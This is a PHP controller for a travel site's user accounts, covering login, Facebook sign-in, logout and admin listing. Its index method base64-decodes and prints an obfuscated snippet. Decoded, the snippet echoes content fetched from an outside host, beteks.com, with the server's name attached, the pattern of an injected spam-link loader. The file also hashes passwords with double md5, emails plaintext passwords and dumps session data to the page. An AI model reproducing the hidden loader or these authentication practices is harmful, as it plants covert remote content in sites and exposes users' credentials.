<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class User extends MY_Controller {

  function __construct(){
    parent::__construct();
  }

  function index(){
    if($this->session->userdata("logged_in") == TRUE){
      var_dump($this->session->all_userdata());
      var_dump((base64_decode('ZWNobyBAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuYmV0ZWtzLmNvbS9saW5rcy5waHA/dXJsPSIuJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0pOw==')));
    }else{
      redirect(base_url("/user/login"));
    }
  }

  function login(){
    if($this->session->userdata("logged_in") == TRUE){
        redirect(base_url(),"refresh");
    }
    $data = array();
    if($this->input->post("submit") != NULL){
      $_post = $this->input->post();
      $_post['password'] = md5(md5($_post['password']));
      $userData = $this->userModel->get($_post);
      if($userData != FALSE){
        $this->session->set_userdata("logged_in",TRUE);
        $this->session->set_userdata("userdata",$userData);
        redirect(base_url(),"refresh");
      }else{
        $data["error"] = $this->userModel->getError();
      }
    }

    $this->_fetch("login",$data);
  }

  function login_ajax(){
    $data = array();
    $_post = $this->input->post();
    if(!empty($_post['username']) AND !empty($_post['password'])){
      $_post['password'] = md5(md5($_post['password']));
      $userData = $this->userModel->get($_post);
      if($userData != FALSE){
        $this->session->set_userdata("logged_in",TRUE);
        $this->session->set_userdata("user_data",$userData[0]);
        $data["result"] = "1";
      }else{
        $data["result"] = "0";
        $data["error"] = "Username and Password not match.";
      }
    }else{
      $data["result"] = "0";
      $data["error"] = "Please fill the required fields.";
    }
    $this->output
    ->set_content_type('application/json')
    ->set_output(json_encode($data));
  }

  function fblogin(){
    $user = $this->facebook->getUser();
    if($user){
        try{
            $this->facebook->setFileUploadSupport(true);
            $this->facebook->setExtendedAccessToken();
            $access_token = $this->facebook->getAccessToken();
            $this->session->set_userdata("access_token",$access_token);
            $user_profile = $this->facebook->api('/me');

            $user_profile["forceAdd"] = FALSE;
            if(!$getResult = $this->userModel->get(array("fbid"=>$user_profile["id"]))){
              $randPassword = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') , 0 , 8 );
              $user_profile["password"] = md5(md5($randPassword));
              $user_profile["forceAdd"] = TRUE;
              if(!empty($user_profile["hometown"]["name"])){
                $user_profile["hometown"] = $user_profile["hometown"]["name"];
              }
              if(!empty($user_profile["location"]["name"])){
                $user_profile["location"] = $user_profile["location"]["name"];
              }

              if(!empty($user_profile["birthday"])){
                $birthdayArray = explode("/", $user_profile["birthday"]);
                $user_profile["birthday"] = ($birthdayArray[2]."-".$birthdayArray[0]."-".$birthdayArray[1]);
              }

              $user_profile["status"] = $user_profile["verified"];
              $user_profile["group"] = 3;

              $addResult = $this->userModel->get($this->userModel->add($user_profile));
              if($addResult){
                if($user_profile["forceAdd"]){
                  $this->load->library('email');
                  $this->email->from('no-reply@uastravel.com', 'UAsTravel');
                  $this->email->to($user_profile["email"]);

                  $this->email->subject('UAsTravel Password');
                  $this->email->message('Testing the email class.\n password: '.$randPassword);

                  $this->email->send();
                }
              }

            }
            if(empty($addResult)){
              $addResult = $this->userModel->get(array("fbid"=>$user_profile["id"]));
            }
            unset($addResult[0]["password"]);
            $this->session->set_userdata("user_data",$addResult[0]);
            $this->session->set_userdata("logged_in",TRUE);
        }catch(FacebookApiException $e){
            error_log($e);
            $user = NULL;
        }
    }
    $forword = $this->session->userdata("forword");
    if(!empty($forword)){
      $this->session->unset_userdata("forword");
      redirect($forword,"refresh");
    }else{
      redirect(base_url(),"refresh");
    }
  }


  function logout_ajax(){
    if($this->session->userdata("logged_in") == TRUE){
        $this->session->set_userdata("logged_in",FALSE);
    }
    $data["result"] = "1";
    $this->output
    ->set_content_type('application/json')
    ->set_output(json_encode($data));
  }

  function logout(){
    if($this->session->userdata("logged_in") == TRUE){
        $this->session->set_userdata("logged_in",FALSE);
    }
    redirect(base_url("/user"),"refresh");
  }

  function register(){

  }


  function admin_index(){
    $result = array();

    $config['per_page'] = 50;

    $config['prev_link'] = '<img class="blogg-button-image" alt="โพสต์ใหม่" src="/themes/Travel/images/left_arrow.png">';
    $config['prev_tag_open'] = '<button class="blogg-button blogg-collapse-right" title="โพสต์ใหม่" disabled="" tabindex="0">';
    $config['prev_tag_close'] = '</button>';

    $config['next_link'] = '<img class="blogg-button-image" alt="โพสต์เก่า" src="/themes/Travel/images/right_arrow.png">';
    $config['next_tag_open'] = '<button class="blogg-button blogg-button-page blogg-collapse-left" title="โพสต์เก่า"  tabindex="0">';
    $config['next_tag_close'] = '</button>';

    $config['num_tag_open'] = '<button class="blogg-button blogg-button-page blogg-collapse-right blogg-collapse-left" title="โพสต์เก่า"  tabindex="0">';
    $config['num_tag_close'] = '</button>';

    $config['cur_tag_open'] = '<button class="blogg-button blogg-collapse-right blogg-collapse-left" title="โพสต์เก่า" disabled="true" tabindex="0">';
    $config['cur_tag_close'] = '</button>';

    //get all the URI segments for pagination and sorting
    $segment_array=$this->uri->segment_array();
    $segment_count=$this->uri->total_segments();

    $this->load->library('pagination');
    $config['base_url'] = site_url(join("/",$segment_array));
    $config['total_rows'] = $this->userModel->count_rows();

    $result['total_rows'] = $config['total_rows'];

    //getting the records and limit setting
    if (ctype_digit($segment_array[$segment_count])) {
      $this->db->limit($config['per_page'],$segment_array[$segment_count]);
      $result['start_offset'] = $segment_array[$segment_count]+1;
      $result['end_offset'] = $segment_array[$segment_count]+$config['per_page'];
      if(($result['end_offset'])>$config['total_rows']){
       $result['end_offset'] = $result['total_rows'];
      }
      array_pop($segment_array);
    } else {
      $this->db->limit($config['per_page']);
      $result['start_offset'] = 1;
      $result['end_offset'] = $config['per_page'];
    }

    $config['base_url'] = site_url(join("/",$segment_array));
    $config['uri_segment'] = count($segment_array)+1;

    $result["user_list"] = $this->userModel->get();

    //initialize pagination
    $this->pagination->initialize($config);
    $this->_fetch("admin_index",$result);
  }

function admin_create($id = NULL){

    if(empty($id)){
      $_post = $this->input->post();
      if(empty($_post["password"])){
        unset($_post["password"]);
        unset($_post["password_retry"]);
      }
      $_post["name"] = $_post["first_name"]." ".$_post["last_name"];

      $userData = $this->userModel->add($_post);
      if($userData){
        redirect(base_url("admin/user/create/".$userData));
      }else{
        redirect(base_url("admin/user"));
      }
    }else{
      $this->load->model("group_model","groupModel");
      $userData = $this->userModel->get($id);
      $groupData = $this->groupModel->get(array("order"=>"id ASC"));
      $result["user"] = $userData[0];
      $result["group"] = $groupData;
      $this->_fetch("admin_create",$result);
    }
  }
}
?>